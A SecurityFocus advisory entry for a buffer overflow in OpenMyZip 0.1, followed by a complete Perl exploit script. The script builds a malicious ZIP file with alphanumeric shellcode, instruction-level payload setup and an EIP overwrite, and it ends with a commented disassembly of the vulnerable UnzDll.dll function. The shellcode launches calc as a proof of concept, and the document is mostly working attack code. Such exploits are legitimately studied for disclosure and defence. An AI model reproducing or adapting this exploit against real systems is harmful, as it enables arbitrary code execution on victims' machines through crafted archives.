source: http://www.securityfocus.com/bid/47678/info


OpenMyZip is prone to a buffer-overflow vulnerability because it fails to perform adequate boundary checks on user-supplied data.

Attackers may leverage this issue to execute arbitrary code in the context of the application. Failed attacks will cause denial-of-service conditions.

OpenMyZip 0.1 is vulnerable; other versions may also be affected. 

#!/usr/bin/perl
#
#
#[+]Exploit Title: OpenMyZip V0.1 .ZIP File Buffer Overflow Vulnerability
#[+]Date: 02\05\2011
#[+]Author: C4SS!0 G0M3S
#[+]Software Link: http://download.cnet.com/OpenMyZip/3000-2250_4-10657274.html
#[+]Version: v0.1
#[+]Tested On: WIN-XP SP3 Brazil Portuguese
#[+]CVE: N/A
#
#
#

use strict;
use warnings;

my $filename = "Exploit.zip"; 


print "\n\n\t\tOpenMyZip V0.1 .ZIP File Buffer Overflow Vulnerability\n";
print "\t\tCreated by C4SS!0 G0M3S\n";
print "\t\tE-mail Louredo_\@hotmail.com\n";
print "\t\tSite www.exploit-br.org/\n\n";

print "\n\n[+] Creting ZIP File...\n";
sleep(1);
my $head = "\x50\x4B\x03\x04\x14\x00\x00".
"\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00" .
"\x00\x00\x00\x00\x00\x00\x00\x00" .
"\xe4\x0f" .
"\x00\x00\x00";

my $head2 = "\x50\x4B\x01\x02\x14\x00\x14".
"\x00\x00\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00" .
"\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\xe4\x0f".
"\x00\x00\x00\x00\x00\x00\x01\x00".
"\x24\x00\x00\x00\x00\x00\x00\x00";

my $head3 = "\x50\x4B\x05\x06\x00\x00\x00".
"\x00\x01\x00\x01\x00".
"\x12\x10\x00\x00".
"\x02\x10\x00\x00".
"\x00\x00";

my $payload = "\x41" x 8;
$payload = $payload.
("\x61" x 7).#6 POPAD
("\x6A\x30").#PUSH 30
("\x5B\x52\x59").#POP EBX / PUSH EDX / POP ECX
("\x41" x 10).#10 INC EAX
("\x02\xd3").#ADD CL,BL
("\x51\x58").#PUSH ECX / POP EAX
("\x98\xd1"); #BASE CONVERSION 
                #"\x98" == "\xff" 
				# "\xd1" == "\xd0" 	
			    #"\xff" + "\xd0" = CALL EAX AND CODE EXECUTION.;-}
$payload .= "\x41" x 22;#MORE PADDING FOR START FROM MY SHELLCODE
$payload .= 
"PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJIYK9PFQO9OO3LUFRPHLN9R".
"TFDZTNQ5NV8VQSHR8MSM8KLUSRXRHKDMUVPBXOLSUXI48X6FCJUZSODNNCMTBOZ7JP2ULOOU2JMUMPTN".
"5RFFIWQM7MFSPZURQYZ5V05ZU4TO7SLKK5KEUBKJPQ79MW8KM12FXUK92KX9SZWWK2ZHOPL0O13XSQCO".#Alpha SHELLCODE WinExec('calc',0) BaseAddress = EAX
"T67JW9HWKLCLNK3EOPWQCE4PQ9103HMZUHFJUYQ3NMHKENJL1S5NHWVJ97MGK9PXYKN0Q51864NVOMUR".
"9K7OGT86OPYJ03K9GEU3OKXSKYZA";
$payload .= "\x44" x (2050-length($payload));
$payload .= "\x58\x78\x39".#POP EAX / JS SHORT 011E0098
"\x41" x 5;# PADDING FOR OVERWRITE EIP
$payload .= pack('V',0x00404042);#JMP EBX
$payload .= "\x42" x 50;
$payload .= "\x41" x (4064-length($payload));

$payload = $payload.".txt";
my $zip = $head.$payload.$head2.$payload.$head3;
open(FILE,">$filename") || die "[-]Error:\n$!\n";
print FILE $zip;
close(FILE);
print "[+] ZIP File Created With Sucess:)\n";
sleep(2);
=head
#
#The Vulnerable Function:
#
#
#The Vulnerable function is in MODULE UnzDll.dll on
#Function UnzDllExec+0x7a3 after CALL the function kernel32.lstrcpyA
#ocorrs the Buffer Overflow on movimentation of the String Very large.
#
#Assemble:
#
#  0x00DA6A6F                                      53               PUSH EBX
#  0x00DA6A70                                      56               PUSH ESI
#  0x00DA6A71                                      8B75 08          MOV ESI,DWORD PTR SS:[EBP+8]
#  0x00DA6A74                                      8B55 18          MOV EDX,DWORD PTR SS:[EBP+18]
#  0x00DA6A77                                      8B45 10          MOV EAX,DWORD PTR SS:[EBP+10]
#  0x00DA6A7A                                      83BE 8CD20000 00 CMP DWORD PTR DS:[ESI+D28C],0
#  0x00DA6A81                                      8D9E 50D80000    LEA EBX,DWORD PTR DS:[ESI+D850]
#  0x00DA6A87                                      74 65            JE SHORT UnzDll.00DA6AEE
#  0x00DA6A89                                      8B8E 84D20000    MOV ECX,DWORD PTR DS:[ESI+D284]
#  0x00DA6A8F                                      890B             MOV DWORD PTR DS:[EBX],ECX
#  0x00DA6A91                                      8B8E 88D20000    MOV ECX,DWORD PTR DS:[ESI+D288]
#  0x00DA6A97                                      894B 04          MOV DWORD PTR DS:[EBX+4],ECX
#  0x00DA6A9A                                      33C9             XOR ECX,ECX
#  0x00DA6A9C                                      C743 08 A0000000 MOV DWORD PTR DS:[EBX+8],0A0
#  0x00DA6AA3                                      894B 0C          MOV DWORD PTR DS:[EBX+C],ECX
#  0x00DA6AA6                                      8B4D 0C          MOV ECX,DWORD PTR SS:[EBP+C]
#  0x00DA6AA9                                      894B 10          MOV DWORD PTR DS:[EBX+10],ECX
#  0x00DA6AAC                                      81BE 88DB0000 91>CMP DWORD PTR DS:[ESI+DB88],91
#  0x00DA6AB6                                      7F 0A            JG SHORT UnzDll.00DA6AC2
#  0x00DA6AB8                                      8BC8             MOV ECX,EAX
#  0x00DA6ABA                                      80E1 FF          AND CL,0FF
#  0x00DA6ABD                                      0FBEC9           MOVSX ECX,CL
#  0x00DA6AC0                                      EB 02            JMP SHORT UnzDll.00DA6AC4
#  0x00DA6AC2                                      8BC8             MOV ECX,EAX
#  0x00DA6AC4                                      894B 14          MOV DWORD PTR DS:[EBX+14],ECX
#  0x00DA6AC7                                      85D2             TEST EDX,EDX
#  0x00DA6AC9                                      8B45 14          MOV EAX,DWORD PTR SS:[EBP+14]
#  0x00DA6ACC                                      8943 18          MOV DWORD PTR DS:[EBX+18],EAX
#  0x00DA6ACF                                      75 06            JNZ SHORT UnzDll.00DA6AD7
#  0x00DA6AD1                                      C643 1C 00       MOV BYTE PTR DS:[EBX+1C],0
#  0x00DA6AD5                                      EB 0A            JMP SHORT UnzDll.00DA6AE1
#  0x00DA6AD7                                      52               PUSH EDX
#  0x00DA6AD8                                      8D53 1C          LEA EDX,DWORD PTR DS:[EBX+1C]
#  0x00DA6ADB                                      52               PUSH EDX
#  0x00DA6ADC                                      E8 ABF20000      CALL UnzDll.00DB5D8C                     ; JMP to kernel32.lstrcpyA
#  0x00DA6AE1                                      53               PUSH EBX
#  0x00DA6AE2                                      FF96 8CD20000    CALL DWORD PTR DS:[ESI+D28C]             ; Here ocorrs the Code Execution:-)
#  0x00DA6AE8                                      0986 70D20000    OR DWORD PTR DS:[ESI+D270],EAX
#  0x00DA6AEE                                      5E               POP ESI
#  0x00DA6AEF                                      5B               POP EBX
#  0x00DA6AF0                                      5D               POP EBP
#  0x00DA6AF1                                      C3               RETN
#
#
#
#
#
=cut
